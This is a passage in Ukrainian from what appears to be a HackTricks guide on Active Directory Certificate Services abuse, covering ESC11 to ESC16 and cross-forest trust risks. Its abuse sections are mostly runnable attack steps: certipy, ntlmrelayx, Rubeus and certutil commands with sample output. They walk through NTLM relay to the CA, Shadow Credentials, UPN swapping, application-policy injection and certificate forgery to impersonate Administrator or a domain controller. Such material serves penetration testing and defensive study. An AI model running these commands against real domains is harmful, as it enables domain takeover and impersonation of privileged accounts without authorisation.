Аутентифікація з отриманим сертифікатом дасть NT хеш `Administrator@corp.local`, що вимагає вказівки домену в команді через відсутність деталей домену в сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Зловживання випадком 2

З `CertificateMappingMethods`, що містить бітовий прапорець `UPN` (`0x4`), обліковий запис A з правами `GenericWrite` може скомпрометувати будь-який обліковий запис B, що не має властивості `userPrincipalName`, включаючи облікові записи машин і вбудованого адміністратора домену `Administrator`.

Тут мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` тепер встановлено на `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується як `Jane`, використовуючи шаблон за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` повертається до свого початкового після цього процесу.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Щоб аутентифікуватися через Schannel, використовується опція Certipy `-ldap-shell`, що вказує на успішну аутентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell команди, такі як `set_rbcd`, дозволяють атаки на основі ресурсів з обмеженою делегацією (RBCD), що потенційно може скомпрометувати контролер домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, який не має `userPrincipalName` або де він не збігається з `sAMAccountName`, при цьому за замовчуванням `Administrator@corp.local` є основною мішенню через свої підвищені привілеї LDAP та відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не налаштований з `IF_ENFORCEENCRYPTICERTREQUEST`, це може призвести до атак NTLM relay без підпису через RPC-сервіс. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Ви можете використовувати `certipy`, щоб перевірити, чи `Enforce Encryption for Requests` вимкнено, і certipy покаже вразливості `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати релейний сервер:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену ми повинні вказати `-template` в DomainController.

Або використовуючи [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell доступ до ADCS CA з YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Центр сертифікації для зберігання його на зовнішньому пристрої, наприклад, "Yubico YubiHSM2".

Якщо USB-пристрій підключено до сервера CA через USB-порт або до сервера USB-пристроїв у випадку, якщо сервер CA є віртуальною машиною, потрібен ключ аутентифікації (іноді його називають "паролем") для того, щоб Провайдер зберігання ключів міг генерувати та використовувати ключі в YubiHSM.

Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Посилання [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Сценарій зловживання

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, коли ви отримали доступ до оболонки, можливо відновити ключ.

Спочатку вам потрібно отримати сертифікат CA (це публічно), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використовуйте команду certutil `-sign`, щоб підробити новий довільний сертифікат, використовуючи сертифікат ЦС та його приватний ключ.

## Зловживання посиланням групи OID - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дозволяє додавати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, які відповідають за видачу політик, можна виявити в Контексті Іменування Конфігурації (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політика може бути пов'язана з групою AD, використовуючи атрибут `msDS-OIDToGroupLink` цього об'єкта, що дозволяє системі авторизувати користувача, який пред'являє сертифікат, так ніби він є членом групи. [Посилання тут](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Іншими словами, коли у користувача є дозвіл на реєстрацію сертифіката, і сертифікат пов'язаний з групою OID, користувач може успадкувати привілеї цієї групи.

Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозволи користувача, які можна використовувати `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на реєстрацію `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Все, що потрібно зробити, це вказати шаблон, він отримає сертифікат з правами OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Вразлива конфігурація поновлення сертифікатів - ESC14

### Пояснення

Опис на https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping є надзвичайно детальним. Нижче наведено цитату з оригінального тексту.

ESC14 стосується вразливостей, що виникають через "слабке явне відображення сертифікатів", переважно через неналежне використання або небезпечну конфігурацію атрибута `altSecurityIdentities` на облікових записах користувачів або комп'ютерів Active Directory. Цей багатозначний атрибут дозволяє адміністраторам вручну асоціювати сертифікати X.509 з обліковим записом AD для цілей аутентифікації. Коли він заповнений, ці явні відображення можуть переважати над логікою відображення сертифікатів за замовчуванням, яка зазвичай спирається на UPN або DNS-імена в SAN сертифіката, або на SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

"Слабке" відображення виникає, коли рядкове значення, що використовується в атрибуті `altSecurityIdentities` для ідентифікації сертифіката, є занадто широким, легко вгадуваним, спирається на неунікальні поля сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо зловмисник може отримати або створити сертифікат, атрибути якого відповідають такому слабо визначеному явному відображенню для привілейованого облікового запису, він може використовувати цей сертифікат для аутентифікації та видавати себе за цей обліковий запис.

Приклади потенційно слабких рядків відображення `altSecurityIdentities` включають:

- Відображення лише за загальним іменем суб'єкта (CN): наприклад, `X509:<S>CN=SomeUser`. Зловмисник може отримати сертифікат з цим CN з менш безпечного джерела.
- Використання надто загальних імен видатних осіб (DN) або імен суб'єктів без подальшої кваліфікації, як-от конкретний серійний номер або ідентифікатор ключа суб'єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або некриптографічних ідентифікаторів, які зловмисник може задовольнити в сертифікаті, який він може легітимно отримати або підробити (якщо він скомпрометував CA або знайшов вразливий шаблон, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати для відображення, такі як:

- `X509:<I>IssuerDN<S>SubjectDN` (відображає за повним DN видатної особи та суб'єкта)
- `X509:<SKI>SubjectKeyIdentifier` (відображає за значенням розширення ідентифікатора ключа суб'єкта сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (відображає за серійним номером, неявно кваліфікованим DN видатної особи) - це не стандартний формат, зазвичай це `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (відображає за іменем RFC822, зазвичай електронною адресою, з SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (відображає за SHA1-хешем сирого публічного ключа сертифіката - зазвичай сильний)

Безпека цих відображень значною мірою залежить від специфічності, унікальності та криптографічної міцності вибраних ідентифікаторів сертифіката, що використовуються в рядку відображення. Навіть за наявності сильних режимів прив'язки сертифікатів, увімкнених на контролерах домену (які в основному впливають на неявні відображення на основі SAN UPN/DNS та розширення SID), погано налаштований запис `altSecurityIdentities` все ще може представляти прямий шлях для підробки, якщо логіка відображення сама по собі є ненадійною або занадто поблажливою.
### Сценарій зловживання

ESC14 націлений на **явні відображення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут встановлений (за дизайном або через неправильну конфігурацію), зловмисники можуть видавати себе за облікові записи, представляючи сертифікати, які відповідають відображенню.

#### Сценарій A: Зловмисник може записувати в `altSecurityIdentities`

**Попередня умова**: Зловмисник має права на запис до атрибута `altSecurityIdentities` цільового облікового запису або право надати його у формі одного з наступних дозволів на цільовому об'єкті AD:
- Записувати властивість `altSecurityIdentities`
- Записувати властивість `Public-Information`
- Записувати властивість (все)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Власник*.
#### Сценарій B: Ціль має слабке відображення через X509RFC822 (електронна пошта)

- **Попередня умова**: Ціль має слабке відображення X509RFC822 в altSecurityIdentities. Зловмисник може встановити атрибут електронної пошти жертви, щоб він відповідав імені X509RFC822 цілі, зареєструвати сертифікат як жертва і використовувати його для аутентифікації як ціль.
#### Сценарій C: Ціль має відображення X509IssuerSubject

- **Попередня умова**: Ціль має слабке явне відображення X509IssuerSubject в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` на жертві, щоб він відповідав суб'єкту відображення X509IssuerSubject цілі. Потім зловмисник може зареєструвати сертифікат як жертва і використовувати цей сертифікат для аутентифікації як ціль.
#### Сценарій D: Ціль має відображення X509SubjectOnly

- **Попередня умова**: Ціль має слабке явне відображення X509SubjectOnly в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` на жертві, щоб він відповідав суб'єкту відображення X509SubjectOnly цілі. Потім зловмисник може зареєструвати сертифікат як жертва і використовувати цей сертифікат для аутентифікації як ціль.
### конкретні операції
#### Сценарій A

Запросити сертифікат шаблону сертифіката `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Збережіть та конвертуйте сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Аутентифікуйте (використовуючи сертифікат)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов'язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш специфічних методів атаки в різних сценаріях атаки, будь ласка, зверніться до наступного: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

Опис на https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc є надзвичайно детальним. Нижче наведено цитату з оригінального тексту.

Використовуючи вбудовані шаблони сертифікатів версії 1 за замовчуванням, зловмисник може створити CSR, щоб включити політики застосування, які є пріоритетними над налаштованими атрибутами розширеного використання ключів, зазначеними в шаблоні. Єдина вимога - права на реєстрацію, і це може бути використано для генерації сертифікатів клієнтської аутентифікації, агента запиту сертифіката та сертифікатів підпису коду, використовуючи шаблон **_WebServer_**.

### Зловживання

Наступне посилається на [це посилання](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), натисніть, щоб побачити більш детальні методи використання.

Команда `find` Certipy може допомогти виявити шаблони V1, які потенційно можуть бути вразливими до ESC15, якщо ЦС не виправлена.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Пряме імперсонування через Schannel

**Крок 1: Запит сертифіката, інжектуючи "Клієнтську автентифікацію" в політику застосування та цільовий UPN.** Атакуючий `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє наданий учасником суб'єкт).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Вразливий шаблон V1 з "Заявник надає суб'єкта".
- `-application-policies 'Client Authentication'`: Впроваджує OID `1.3.6.1.5.5.7.3.2` у розширення Політики застосування CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для імперсонації.

**Крок 2: Аутентифікація через Schannel (LDAPS) з використанням отриманого сертифіката.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Імітація через Зловживання Агентом Реєстрації

**Крок 1: Запросіть сертифікат з шаблону V1 (з "Заявник надає суб'єкт"), інжектуючи "Політику застосування агента сертифіката".** Цей сертифікат призначений для зловмисника (`attacker@corp.local`), щоб стати агентом реєстрації. Жоден UPN не вказується для власної ідентичності зловмисника, оскільки мета полягає в здатності агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Впроваджує OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використовуйте сертифікат "агента" для запиту сертифіката від імені цільового привілейованого користувача.** Це крок, подібний до ESC3, використовуючи сертифікат з Кроку 1 як сертифікат агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Аутентифікуйтеся як привілейований користувач, використовуючи сертифікат "від імені".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Підвищення привілеїв через відсутність розширення szOID_NTDS_CA_SECURITY_EXT)** відноситься до сценарію, коли, якщо конфігурація AD CS не вимагає включення розширення **szOID_NTDS_CA_SECURITY_EXT** у всі сертифікати, зловмисник може скористатися цим, виконуючи наступні дії:

1. Запитуючи сертифікат **без прив'язки SID**.

2. Використовуючи цей сертифікат **для аутентифікації як будь-який обліковий запис**, наприклад, видаючи себе за обліковий запис з високими привілеями (наприклад, адміністратора домену).

Ви також можете звернутися до цієї статті, щоб дізнатися більше про детальний принцип: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Наступне посилається на [це посилання](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), натисніть, щоб побачити більш детальні методи використання.

Щоб визначити, чи вразливе середовище Active Directory Certificate Services (AD CS) до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитайте початковий UPN жертви (Необов'язково - для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN жертви на `sAMAccountName` цільового адміністратора.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (Якщо потрібно) Отримати облікові дані для облікового запису "жертви" (наприклад, через Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат як "жертва" користувача з _будь-якого підходящого шаблону автентифікації клієнта_ (наприклад, "Користувач") на CA, вразливому до ESC16.** Оскільки CA вразливий до ESC16, він автоматично пропустить розширення безпеки SID з виданого сертифіката, незалежно від конкретних налаштувань шаблону для цього розширення. Встановіть змінну середовища кешу облікових даних Kerberos (команда оболонки):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запитайте сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Поверніть UPN облікового запису "жертви".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Аутентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Компрометація Лісів з Сертифікатами Пояснена в Пасивному Голосі

### Порушення Лісових Довіреностей через Компрометовані ЦА

Конфігурація для **крос-лісової реєстрації** є відносно простою. **Кореневий сертифікат ЦА** з ресурсного лісу **публікується в облікових лісах** адміністраторами, а **сертифікати підприємницької ЦА** з ресурсного лісу **додаються до контейнерів `NTAuthCertificates` та AIA в кожному обліковому лісі**. Для уточнення, ця угода надає **ЦА в ресурсному лісі повний контроль** над усіма іншими лісами, для яких вона управляє PKI. Якщо ця ЦА буде **компрометована зловмисниками**, сертифікати для всіх користувачів як в ресурсному, так і в облікових лісах можуть бути **підроблені ними**, тим самим порушуючи межу безпеки лісу.

### Привілеї Реєстрації, Надані Іноземним Принципалам

У багатолісових середовищах необхідна обережність щодо підприємницьких ЦА, які **публікують шаблони сертифікатів**, що дозволяють **Аутентифікованим Користувачам або іноземним принципалам** (користувачам/групам, які не належать до лісу, до якого належить підприємницька ЦА) **права на реєстрацію та редагування**.\
Після аутентифікації через довіру, **SID Аутентифікованих Користувачів** додається до токена користувача AD. Таким чином, якщо домен має підприємницьку ЦА з шаблоном, який **дозволяє права на реєстрацію Аутентифікованим Користувачам**, шаблон може потенційно бути **зареєстрований користувачем з іншого лісу**. Аналогічно, якщо **права на реєстрацію явно надані іноземному принципалу шаблоном**, **створюється крос-лісова відносина контролю доступу**, що дозволяє принципалу з одного лісу **реєструватися в шаблоні з іншого лісу**.

Обидва сценарії призводять до **збільшення площі атаки** з одного лісу в інший. Налаштування шаблону сертифіката можуть бути використані зловмисником для отримання додаткових привілеїв в іноземному домені.


{{#include ../../../banners/hacktricks-training.md}}
